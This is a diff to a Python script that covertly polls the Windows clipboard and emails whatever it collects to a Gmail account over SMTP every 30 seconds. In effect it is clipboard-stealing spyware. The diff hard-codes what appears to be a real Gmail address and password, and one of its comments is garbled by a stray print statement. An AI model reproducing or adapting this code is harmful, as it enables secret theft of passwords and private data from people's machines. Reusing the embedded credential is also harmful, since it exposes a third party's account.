@@ -15,12 +15,12 @@ import time
 
 
 #Accound details for user email
-email = "YOUR GMAIL ACCOUNT"
-password = "YOUR GMAIL PASSWORD"
+email = "pyteser@gmail.com"
+password = "N15IEYwqEwI7"
 port = 465
 
 #ttl = time to live, how long the program will run for in seconds(24hrs)
-ttl = 86400#time to live, to be changed
+ttl = 5 #time to live, to be changed
 
 # =============================================================================
 #function to send clipboard data to a defined email address via smtp
@@ -40,7 +40,7 @@ def is_ascii(s):
 # =============================================================================
 
 # =============================================================================
-#this function copies data from the clipboard to a variable c
+#this function copies data from the clipboard to a print("P2:",c,onBoard) c
 def clipboardCopy(c):
     try:
         win32clipboard.OpenClipboard()
@@ -48,15 +48,10 @@ def clipboardCopy(c):
         #print if var is different
         if c != onBoard and is_ascii(onBoard) == True:
             c = onBoard
-            print(c)
-        else: #empty variable if c is the same as before
-            c = ""
-            
-        win32clipboard.CloseClipboard()
-        time.sleep(1.5)
     except:
-        win32clipboard.CloseClipboard()
-        time.sleep(1.5)
+        pass
+    win32clipboard.CloseClipboard()
+    time.sleep(1.5)
     return c
 # =============================================================================
 
@@ -72,16 +67,19 @@ def main():
     start = time.time()
     while time.time() - start < ttl:
         currentData = clipboardCopy(currentData)
-        if currentData != "": #add currentData to message stirng if non empty
-            message = message + "\n*****\n" + currentData
+        if currentData != lastData: #add currentData to message if it has changed
+            message =  message + "\n*****\n" + currentData 
+            
         time_dif = round((time.time() - start))  
         every = 30 #send email after 'every' seconds
-    #if current time is equal to deicced time in seconds send email(5 minutes)
-        if  time_dif % every == 0 and lastData != currentData: 
+        #if current time is equal to deicced time in seconds send email
+        if  time_dif % every == 0: 
             sendClipboard(email,password,message,port)
-            lastData = currentData
             message = ""
             
+        lastData = currentData
+        #print(lastData) #see last piece scrapped
+        
     #Send at the very end of life just in case
     sendClipboard(email,password,message,port)
 # =============================================================================
